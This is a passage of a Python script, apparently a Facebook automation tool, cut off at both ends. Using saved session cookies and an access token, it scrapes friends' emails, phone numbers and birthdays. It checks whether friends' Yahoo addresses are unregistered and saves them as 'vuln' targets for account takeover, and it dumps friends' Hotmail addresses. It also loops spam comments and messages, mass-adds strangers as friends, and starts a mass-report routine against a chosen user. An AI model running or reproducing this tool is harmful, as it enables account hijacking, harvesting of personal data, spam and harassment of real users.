				print(f"[-] {name} - unfollow")
		except KeyError:
			exit("\n[!] error:)*")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	exit("\n[*] done")

def leave_groups():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			print("[*] fetching all groups id")
			try:
				for x in s.get(api.format("me/groups?access_token=%s"%(token)),headers=hea).json()["data"]:
					target.append(x["id"])
					print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
					sys.stdout.flush()
					sleep(0.009)
			except KeyError:
				exit("\n[!] failed to retrieve all groups id")
			except requests.exceptions.ConnectionError:
				print("\n[!] failed to retrive all groups id")
				exit("[!] check your connection")
			print("\n[*] all groups id successfully retrieved")
			input("[*] press enter to continue ")
			print("[*] start ...\n")
			mainLeave(target)
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainLeave(idg):
	for id in idg:
		try:
			data=[]
			a=s.get(url.format("/group/leave/?group_id=%s"%(id)),headers=hea).text
			bs=BS(a,"html.parser")
			if not "Keluar dari Grup" in str(bs):
				print(f"[-] {id} - failed leave the groups")
			else:
				for x in bs("form"):
					if "/a/group/leave/?" in x["action"]:
						data.append(x["action"])
						break
				for x in bs("input"):
					try:
						if "fb_dtsg" in x["name"]:
							data.append(x["value"])
						if "jazoest" in x["name"]:
							data.append(x["value"])
							break
					except:pass
				if len(data)==3:
					b=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"group_id":id,"confirm":"Keluar dari Grup"},headers=hea).text
					bs1=BS(b,"html.parser")
					if "Gabung ke Grup" in str(bs1):
						print(f"[-] {bs1.title.text} - success leave the groups")
					else:
						print(f"[-] {bs1.title.text} - failed leave the groups")
				else:
					print(f"[-] {id} - failed leave the groups")
		except requests.exceptions.ConnectionError:
			exit("[!] connection error")
		
def acc_del():
	global tipe,tipee,token
	try:
		token=open("log/token.log").read()
	except IOError:
		exit("[warning] access token not found")
	ac=input("[?] accept or delete? (a/d): ").lower()
	if ac in [""]:
		exit("[!] you stuppid")
	elif ac in ["a","accept"]:
		tipe="Konfirmasi"
		tipee="confirm"
		cek_ac()
	elif ac in ["d","delete"]:
		tipe="Hapus Permintaan"
		tipee="delete"
		cek_ac()
	else:
		exit("[!] you stuppid")
def cek_ac():
	global tipe,tipee,token
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			print("[*] fetching all user id")
			main_ac(url.format("/friends/center/requests"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def main_ac(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for b in bs.find_all("a",string=tipe):
			try:
				if "/a/notifications.php?" in str(b):
					idt=re.findall(r"/?"+tipee+"=(.*?)&seenrequesttime=",b.get("href"))
					target.append(url.format(b.get("href")))
					print("\r[*] %s retrieved > %s  "%(idt[0],len(target)),end=""),
					sys.stdout.flush()
					sleep(0.009)
			except:pass
		if "Lihat selengkapnya" in str(a):
			main_ac(url.format(bs.find("a",string="Lihat selengkapnya").get("href")))
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all user id")
		exit("[!] check your onnection")
	print("\n[*] all user id successfully retrieved")
	input("[*] press enter to continue ")
	print("[*] start ...\n")
	for id in target:
		if tipe=="Konfirmasi":
			try:
				idd=re.findall(r"/?confirm=(.*?)&seenrequesttime=",id)[0]
				name=s.get(api.format("%s?access_token=%s"%(idd,token)),headers=hea).json()["name"]
				d=s.get(id,headers=hea)
				if d.status_code==200:
					print(f"[-] {name} - accept")
				else:
					print(f"[-] {name} - failed")
			except KeyError:
				exit("[!] error:)*")
			except IndexError:pass
			except requests.exceptions.ConnectionError:
				exit("\n[!] connection error")
		elif tipe=="Hapus Permintaan":
			try:
				idd=re.findall(r"/?delete=(.*?)&seenrequesttime=",id)[0]
				name=s.get(api.format("%s?access_token=%s"%(idd,token)),headers=hea).json()["name"]
				d=s.get(id,headers=hea)
				if d.status_code==200:
					print(f"[-] {name} - deleted")
				else:
					print(f"[-] {name} - failed")
			except KeyError:
				exit("[!] error:)*")
			except IndexError:pass
			except requests.exceptions.ConnectionError:
				exit("\n[!] connection error")
	exit("\n[*] done")
	
def my_groups():
	print()
	try:
		for x in s.get(api.format("me/groups?access_token=%s"%(token)),headers=hea).json()["data"]:
			name=x["name"]
			id=x["id"]
			print(f"[-] Name - {name}")
			print(f"[-] ID   - {id}\n")
	except KeyError:
		exit("\n[!] error:)*")
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	input("\n[*] press enter to back ")
	menu()

def user_information():
	user=input("[?] user id: ")
	if user in [""]:
		exit("[!] you stuppid")
	try:
		a=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
		fol=s.get(api.format("%s/subscribers?access_token=%s"%(user,token)),headers=hea).json()["summary"]["total_count"]
		name=a["name"]
		id=a["id"]
	except KeyError:
		exit("[!] user id not found")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	print("[*] please wait a minute")
	sleep(2)
	friends=[]
	print("\n[#] RESULT")
	print(f"[-] name         : {name}")
	print(f"[-] id           : {id}")
	try:
		bir=a["birthday"]
		print(f"[-] birthday     : {bir}")
	except KeyError:
		print("[-] birthday     : not found")
	try:
		no=a["mobile_phone"]
		print(f"[-] numbers phone: {no}")
	except KeyError:
		print("[-] numbers phone: not found")
	try:
		no=a["email"]
		print(f"[-] email        : {name}")
	except KeyError:
		print(f"[-] email        : not found")
	print(f"[-] followers    : {str(fol)}")
	try:
		for fr in s.get(api.format("%s/friends?access_token=%s"%(user,token)),headers=hea).json()["data"]:
			friends.append(fr["id"])
		print(f"[-] total friends: {(len(friends))}")
	except KeyError:
		print("[-] total friends: not found")
	try:
		loc=a["location"]["name"]
		print(f"[-] location     : {loc}")
	except KeyError:
		print("[-] location     : not found")
	try:
		print("[-] school       : ")
		for z in a["education"]:
			sc=z["school"]["name"]
			print(f"      ~ {sc}")
	except KeyError:
		print("      ~ not found")
	input("\n[*] press enter to back ")
	menu()

def yahoo_checker():
	global o
	print("[*] fetching all friends id")
	try:
		for x in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrieve all friends id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all friends id")
		exit("[!] check your onnection")
	print("\n[*] all friends id successfully retrieved")
	print("[*] getting email from friends")
	print("[*] start ...\n")
	try:
		os.mkdir("yahoo")
	except:pass
	o=open("yahoo/mail_vuln.txt","w")
	for user in target:
		try:
			a=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
			b=s.get(api.format("%s/subscribers?access_token=%s"%(user,token)),headers=hea).json()
			id=a["id"]
			nam=a["name"]
			em=a["email"]
			sub=b["summary"]["total_count"]
			p=re.compile(r'@.*').search(em).group()
			if "yahoo.com" in (p):
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html=True
				br.select_form(nr=0)
				br["username"]=em
				log=br.submit().read()
				if "messages.ERROR_INVALID_USERNAME" in str(log):
					o.write("%s\n"%(em))
					print(f"[•] Uid      : {id}")
					print(f"[•] Name     : {nam}")
					print(f"[•] Email    : {em}")
					try:
						bir=a["birthday"]
						print(f"[•] Birthday : {bir}")
					except KeyError:
						print("[•] Birthday : not found")
					print(f"[•] Followers: {sub}")
					print("[•] Status   : vuln\n")
		except:pass
	print("\n[*] done")
	exit("[#] email vuln saved as: yahoo/mail_vuln.txt")

def get_hotmail():
	global wrt
	print("[*] fetching all friends id")
	try:
		for x in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrieve all friends id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all friends id")
		exit("[!] check your onnection")
	print("\n[*] all friends id successfully retrieved")
	print("[*] getting email hotmail from friends")
	print("[*] start ...\n")
	try:
		os.mkdir("dump")
	except:pass
	wrt=open("dump/friends_hotmail.txt","w")
	m=ThreadPool(30)
	m.map(gethot,target)
	wrt.close()
	print("\n[*] done")
	exit("[#] file saved as: dump/friends_hotmail.txt")
def gethot(user):
	try:
		a=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
		email=a["email"]
		name=a["name"]
		p=re.compile(r'@.*').search(email).group()
		if "hotmail.com" in str(p):
			wrt.write("%s\n"%(email))
			print(f"[-] {name} > {email}")
	except KeyError:pass

def auto_pokes():
	limit=input("[?] how many: ")
	if limit in [""]:
		exit("[!] you stuppid")
	print("[*] fetching all post id")
	try:
		for x in s.get(api.format("v3.0/me?fields=home.limit(%s)&access_token=%s"%(limit,token)),headers=hea).json()["home"]["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrieve all post id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all post id")
		exit("[!] check your onnection")
	print("\n[*] all post id successfully retrieved")
	print("[*] start ...\n")
	for user in target:
		try:
			a=s.post(api.format("%s/pokes?access_token=%s"%(user.split("_")[0],token)),headers=hea).json()
			name=s.get(api.format("%s?access_token=%s"%(user.split("_")[0],token)),headers=hea).json()["name"]
			try:
				error=a["error"]["message"]
				print(f"[-] {name} - failed to pokes")
			except TypeError:
				print(f"[-] {name} - success pokes")
		except KeyError:
			exit("\n[!] Error:)*")
		except requests.exceptions.ConnectionError:
			exit("[!] connection error")
	exit("\n[*] done")

def pl():
	global tipe
	wt=input("[?] wallpost or target? (w/t): ").lower()
	if wt in [""]:
		exit("[!] you stuppid")
	elif wt in ["w","wallpost"]:
		main_reacW()
	elif wt in ["t","target"]:
		main_reacT()
	else:
		exit("[!] you stuppid")
	
def reactions():
	global tipe
	menu_reactions()
	CH=input("[+] auto/reactions_> ")
	if CH in [""]:
		exit("[!] you stuppid")
	elif CH in ["1","01"]:
		tipe="LIKE"
		pl()
	elif CH in ["2","02"]:
		tipe="LOVE"
		pl()
	elif CH in ["3","03"]:
		tipe="WOW"
		pl()
	elif CH in ["4","04"]:
		tipe="HAHA"
		pl()
	elif CH in ["5","05"]:
		tipe="SAD"
		pl()
	elif CH in ["6","06"]:
		tipe="ANGRY"
		pl()
	elif CH in ["0","00"]:
		menu()
	else:
		exit("[!] you stuppid")

def main_reacW():
	limit=input("[?] how many: ")
	if limit in [""]:
		exit("[!] you stuppid")
	print("[*] fetching all post id")
	try:
		for x in s.get(api.format("v3.0/me?fields=home.limit(%s)&access_token=%s"%(limit,token)),headers=hea).json()["home"]["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrieve all post id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all post id")
		exit("[!] check your onnection")
	print("\n[*] all post id successfully retrieved")
	print(f"[*] reactions type {tipe}")
	print("[*] start ...\n")
	for user in target:
		try:
			name=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
			rea=s.post(api.format("%s/reactions?type=%s&access_token=%s"%(user,tipe,token)),headers=hea).json()
			if "success" in str(rea):
				try:
					cap=name["message"][:40]+"..."
					print(f"[-] {cap} - success reactions")
				except KeyError:
					try:
						cap=name["story"][:40]+"..."
						print(f"[-] {cap} - success reactions")
					except KeyError:
						print(f"[-] {user} - success reactions")
			else:
				print(f"[-] {user} - failed to reactions")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	exit("\n[*] done")

def main_reacT():
	idt=input("[?] target id: ")
	limit=input("[?] how many: ")
	if limit in [""] and idt in [""]:
		exit("[!] you stuppid")
	print("[*] fetching all post id")
	try:
		for x in s.get(api.format("v3.0/%s?fields=feed.limit(%s)&access_token=%s"%(idt,limit,token)),headers=hea).json()["feed"]["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
			print(x["id"])
	except KeyError:
		exit("\n[!] failed to retrieve all post id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all post id")
		exit("[!] check your onnection")
	print("\n[*] all post id successfully retrieved")
	print(f"[*] reactions type {tipe}")
	print("[*] start ...\n")
	for user in target:
		try:
			name=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
			rea=s.post(api.format("%s/reactions?type=%s&access_token=%s"%(user,tipe,token)),headers=hea).json()
			if "success" in str(rea):
				try:
					cap=name["message"][:40]+"..."
					print(f"[-] {cap} - success reactions")
				except KeyError:
					try:
						cap=name["story"][:40]+"..."
						print(f"[-] {cap} - success reactions")
					except KeyError:
						print(f"[-] {user} - success reactions")
			else:
				print(f"[-] {user} - failed to reactions")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	exit("\n[*] done")

def auto_comment():
	wt=input("[?] wallpost or target? (w/t): ")
	if wt in [""]:
		exit("[!] you stuppid")
	elif wt in ["w","wallpost"]:
		comw()
	elif wt in ["t","target"]:
		comt()
	else:
		exit("[!] you stuppid")
def comw():
	limit=input("[?] how many: ")
	if limit in [""]:
		exit("[!] you stuppid")
	print("[*] fetching all post id")
	try:
		for x in s.get(api.format("v3.0/me?fields=home.limit(%s)&access_token=%s"%(limit,token)),headers=hea).json()["home"]["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrieve all post id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all post id")
		exit("[!] check your onnection")
	print("\n[*] all post id successfully retrieved")
	print("[!] type '<>' for newlines")
	msg=input("[?] message: ").replace("<>","\n")
	if msg in [""]:
		exit("[!] you stuppid")
	print("[*] start ...\n")
	for user in target:
		try:
			a=s.post(api.format("%s/comments?message=%s&access_token=%s"%(user,msg,token)),headers=hea)
			b=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
			try:
				me=b["message"][:40]+"..."
				print(f"[-] {me} - success commented")
			except KeyError:
				try:
					me=b["story"][:40]+"..."
					print(f"[-] {me} - success commented")
				except KeyError:
					print(f"[-] {me} - success commented")
		except KeyError:
			exit("\n[*] Error:)*")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	exit("\n[*] done")
		
def comt():
	idt=input("[?] target id: ")
	limit=input("[?] how many: ")
	if idt in [""] and limit in [""]:
		exit("[!] you stuppid")
	print("[*] fetching all post id")
	try:
		for x in s.get(api.format("v3.0/%s?fields=feed.limit(%s)&access_token=%s"%(idt,limit,token)),headers=hea).json()["feed"]["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrieve all post id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all post id")
		exit("[!] check your onnection")
	print("\n[*] all post id successfully retrieved")
	print("[!] type '<>' for newlines")
	msg=input("[?] message: ").replace("<>","\n")
	if msg in [""]:
		exit("[!] you stuppid")
	print("[*] start ...\n")
	for user in target:
		try:
			a=s.post(api.format("%s/comments?message=%s&access_token=%s"%(user,msg,token)),headers=hea)
			b=s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
			try:
				me=b["message"][:40]+"..."
				print(f"[-] {me} - success commented")
			except KeyError:
				try:
					me=b["story"][:40]+"..."
					print(f"[-] {me} - success commented")
				except KeyError:
					print(f"[-] {me} - success commented")
		except KeyError:
			exit("\n[*] Error:)*")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	exit("\n[*] done")
	
def auto_chat():
	menu_chat()
	pl=input("[+] auto/chat_> ")
	if pl in [""]:
		exit("[!] you stuppid")
	elif pl in ["1","01"]:
		cekcok()
	elif pl in ["2","02"]:
		maincatt()
	elif pl in ["0","00"]:
		menu()
	else:
		exit("[!] you stuppid")
		
def cekcok():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			maincatm()
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
		
def cekcokk():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			maincatt()
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	
def maincatm():
	limit=input("[?] how many: ")
	if limit in [""]:
		exit("[!] you stuppid")
	print("[*] fetching all friends id")
	try:
		for x in s.get(api.format("me/friends?fields=name,id&limit=%s&access_token=%s"%(limit,token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.009)
	except KeyError:
		exit("\n[!] failed to retrieve all friends id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrieve all friends id")
		exit("[!] check your onnection")
	print("\n[*] all friends id successfully retrieved")
	print("[!] type '<>' for newlines")
	msg=input("[?] message: ").replace("<>","\n")
	if msg in [""]:
		exit("[!] you stuppid")
	print("[*] start ...\n")
	for user in target:
		try:
			data=[]
			a=s.get(url.format("/messages/thread/%s/"%(user)),headers=hea).text
			bs=BS(a,"html.parser")
			for x in bs("form"):
				if "/messages/send/?" in x["action"]:
					data.append(x["action"])
					break
			for x in bs("input"):
				try:
					if "fb_dtsg" in x["name"]:
						data.append(x["value"])
					if "jazoest" in x["name"]:
						data.append(x["value"])
						break
				except:pass
			if len(data)==3:
				send=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"body":msg,"ids["+user+"]":user},headers=hea)
				if send.status_code==200:
					print(f"[-] {bs.title.text} - success")
				else:
					print(f"[-] {bs.title.text} - failed")
			else:
				print(f"[!] error when sending a message to {bs.title.text}")
		except requests.exceptions.ConnectionError:
			exit("[!] connection error")
		except IndexError:
			print(f"[!] error when sending a message to {bs.title.text}")
	exit("\n[*] done")

def maincatt():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		f=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(f):
			print("[*] cookies valid")
			user=input("[?] target id: ")
			if user in [""]:
				exit("[!] you stuppid")
			e=s.get(url.format("/%s?v=timeline"%(user)),headers=hea).text
			be=BS(e,"html.parser")
			if not "Pesan" in str(be):
				exit("[!] target not found")
			link=[]
			for x in be.find_all("a",string="Pesan"):
				link.append(x.get("href"))
			if len(link)==1:
				id=re.findall(r"/thread/(.*?)/?entrypoint=",link[0])[0].replace("/?","")
			elif len(link)==2:
				id=re.findall(r"/thread/(.*?)/?entrypoint=",link[1])[0].replace("/?","")
			limit=input("[?] how many: ")
			print("[!] type '<>' for newlines")
			msg=input("[?] message: ").replace("<>","\n")
			if limit in [""] and msg in [""]:
				exit("[!] you stuppid")
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	except IndexError:
		exit("[!] error:)*")
	print(f"[*] sending a message to {be.title.text}")
	print("[*] delay 5 second")
	print("[*] start ...\n")
	for i in range(int(limit)):
		try:
			data=[]
			if len(link)==1:
				a=s.get(url.format(link[0]),headers=hea).text
			elif len(link)==2:
				a=s.get(url.format(link[1]),headers=hea).text
			bs=BS(a,"html.parser")
			for x in bs("form"):
				if "/messages/send/?" in x["action"]:
					data.append(x["action"])
					break
			for x in bs("input"):
				try:
					if "fb_dtsg" in x["name"]:
						data.append(x["value"])
					if "jazoest" in x["name"]:
						data.append(x["value"])
						break
				except:pass
			if len(data)==3:
				msgg=msg.replace("\n","")
				send=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"body":msg,"ids["+id+"]":id},headers=hea)
				if send.status_code==200:
					print(f"[-] {msgg} - success")
				else:
					print(f"[-] {msgg} - failed")
			else:
				print(f"[!] error when sending a message to {id}")
			sleep(5)
		except requests.exceptions.ConnectionError:
			exit("[!] connection error")
		except IndexError:
			print(f"[!] error when sending a message to {id}")
	exit("\n[*] done")

def reaccom():
	global tipe,tip
	menu_reactions()
	CH=input("[+] reactions/coment_> ")
	if CH in [""]:
		exit("[!] you stuppid")
	elif CH in ["1","01"]:
		tipe="0"
		tip="LIKE"
		reaccmpost()
	elif CH in ["2","02"]:
		tipe="1"
		tip="LOVE"
		reaccmpost()
	elif CH in ["3","03"]:
		tipe="3"
		tip="WOW"
		reaccmpost()
	elif CH in ["4","04"]:
		tipe="2"
		tip="HAHA"
		reaccmpost()
	elif CH in ["5","05"]:
		tipe="4"
		tip="SAD"
		reaccmpost()
	elif CH in ["6","06"]:
		tipe="5"
		tip="ANGRY"
		reaccmpost()
	elif CH in ["0","00"]:
		menu()
	else:
		exit("[!] you stuppid")

def reaccmpost():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			print("[!] use https://mbasic.facebook.com/")
			link=input("[?] post link: ")
			if link in [""]:
				exit("[!] you stuppid")
			mainrecom(link)
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainrecom(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		if not "Tanggapi" in str(bs):
			exit("[!] post not found")
		for x in bs.find_all("a",string="Tanggapi"):
			if "/reactions/picker/?" in str(x):
				target.append(url.format(x.get("href")))
				print(f"\r[*] getting comment id > {len(target)}  ",end="")
				sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	print(f"\n[*] reactions tipe {tip}")
	print("[*] start ...\n")
	for id in target:
		try:
			data=[]
			ids=re.findall(r"/?ft_id=(.*?)&origin_uri=",id)[0]
			b=s.get(id,headers=hea).text
			bs1=BS(b,"html.parser")
			for c in bs1.find_all("a"):
				try:
					if "/ufi/reaction/?" in str(c):
						data.append(c.get("href"))
				except:pass
			rec=s.get(url.format(data[int(tipe)]),headers=hea)
			if rec.status_code==200:
				print(f"[-] {ids} - success reactions")
			else:
				print(f"[-] {ids} - failed to reactions")
		except IndexError:
			print("\n[!] Error:)*")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	exit("\n[*] done")

def spamcom():
	global limit,msg
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			print("[!] use https://mbasic.facebook.com/")
			link=input("[?] post link: ")
			limit=input("[?] how many: ")
			print("[!] type '<>' fornewlines")
			msg=input("[?] message: ").replace("<>","\n")
			if link in [""] and limit in [""] and msg in [""]:
				exit("[!] you stuppid")
			print("[*] delay 5 second")
			print("[*] start ...\n")
			mainspamcom(link)
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainspamcom(link):
	try:
		data=[]
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		if not "Tulis komentar..." in str(bs):
			exit("[!] post not found")
		for x in bs("form"):
			if "/a/comment.php?" in x["action"]:
				data.append(x["action"])
				break
		for x in bs("input"):
			if "fb_dtsg" in x["name"]:
				data.append(x["value"])
			if "jazoest" in x["name"]:
				data.append(x["value"])
				break
		for i in range(int(limit)):
			if len(data)==3:
				msgg=msg.replace("\n","")
				com=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":[2],"comment_text":msg},headers=hea)
				if com.status_code==200:
					print(f"[-] {msgg} - success commented")
				else:
					print(f"[-] {msgg} - failed")
				sleep(5)
		exit("\n[*] done")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
		
def auto_add():
	menu_add()
	pl=input("[+] auto/add_> ")
	if pl in [""]:
		exit("[!] you stuppid")
	elif pl in ["1","01"]:
		add_Fgroups()
	elif pl in ["2","02"]:
		add_Ffriends()
	elif pl in ["0","00"]:
		menu()
	else:
		exit("[!] you stuppid")

def add_Fgroups():
	gid=input("[?] groups id: ")
	if gid in [""]:
		exit("[!] you stuppid")
	try:
		a=s.get(api.format("group/?id=%s&access_token=%s"%(gid,token)),headers=hea).json()["name"]
	except KeyError:
		exit("[!] groups id not found")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	limit=input("[?] how many: ")
	if limit in [""]:
		exit("[!] you stuppid")
	print("[*] fetching all user id")
	print(f"[*] from {a}")
	try:
		for x in s.get(api.format("%s/members?fields=name,id&limit=%s&access_token=%s"%(gid,limit,token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrive all user id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all user id")
		exit("[!] check your connection")
	print("\n[*] all user id successfully retrieved")
	print("[*] delay 10 second")
	print("[*] start ...\n")
	for id in target:
		try:
			add=s.post(api.format("me/friends?method=post&uids=%s&access_token=%s"%(id,token)),headers=hea).json()
			if add==True:
				print(f"[-] {id} - success")
			else:
				print(f"[-] {id} - failed")
			sleep(10)
		except requests.exceptions.ConnectionError:
			exit("[!] connection error")
	exit("\n[*] done")
	
def add_Ffriends():
	fid=input("[?] friends id: ")
	if fid in [""]:
		exit("[!] you stuppid")
	try:
		a=s.get(api.format("%s?access_token=%s"%(fid,token)),headers=hea).json()["name"]
	except KeyError:
		exit("[!] friends id not found")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	limit=input("[?] how many: ")
	if limit in [""]:
		exit("[!] you stuppid")
	print("[*] fetching all user id")
	print(f"[*] from {a}")
	try:
		for x in s.get(api.format("%s/friends?fields=name,id&limit=%s&access_token=%s"%(fid,limit,token)),headers=hea).json()["data"]:
			target.append(x["id"])
			print("\r[*] %s retrieved > %s  "%(x["id"],len(target)),end=""),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		exit("\n[!] failed to retrive all user id")
	except requests.exceptions.ConnectionError:
		print("\n[!] failed to retrive all user id")
		exit("[!] check your connection")
	print("\n[*] all user id successfully retrieved")
	print("[*] delay 10 second")
	print("[*] start ...\n")
	for id in target:
		try:
			add=s.post(api.format("me/friends?method=post&uids=%s&access_token=%s"%(id,token)),headers=hea).json()
			if add==True:
				print(f"[-] {id} - success")
			else:
				print(f"[-] {id} - failed")
			sleep(10)
		except requests.exceptions.ConnectionError:
			exit("[!] connection error")
	exit("\n[*] done")

def unadd():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			mainunadd(url.format("/friends/center/requests/outgoing"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainunadd(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		if "Batalkan Permintaan" in str(a):
			for x in bs.find_all("a",string="Batalkan Permintaan"):
				target.append(x.get("href"))
				print(f"\r[*] getting friends requests id > {len(target)}  ",end="")
				sys.stdout.flush()
		if "Lihat selengkapnya" in str(bs):
			mainunadd(url.format(bs.find("a",string="Lihat selengkapnya").get("href")))
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	input("\n[*] press enter to continue ")
	print("[*] start ...\n")
	m=ThreadPool(10)
	m.map(mainun,target)
	exit("\n[*] done")
def mainun(id):
	try:
		un=s.get(url.format(id),headers=hea)
		ida=re.findall(r"/?subject_id=(.*?)&ref_param=",id)
		if un.status_code==200:
			try:
				print(f"[-] {ida[0]} - success")
			except IndexError:
				print("[-] - success")
		else:
			try:
				print(f"[-] {ida[0]} - failed")
			except IndexError:
				print(f"[-] - failed")
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")

def reportt():
	global idt
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			idt=input("[?] target id: ")
			if idt.lower() in ["","dulahz","100005584243934","dulahz/","100005584243934/"]:
				exit("[!] you stuppid")
			mainreportgid(url.format("/%s?v=timeline"%(idt)))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def mainreportgid(link):
	try:
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
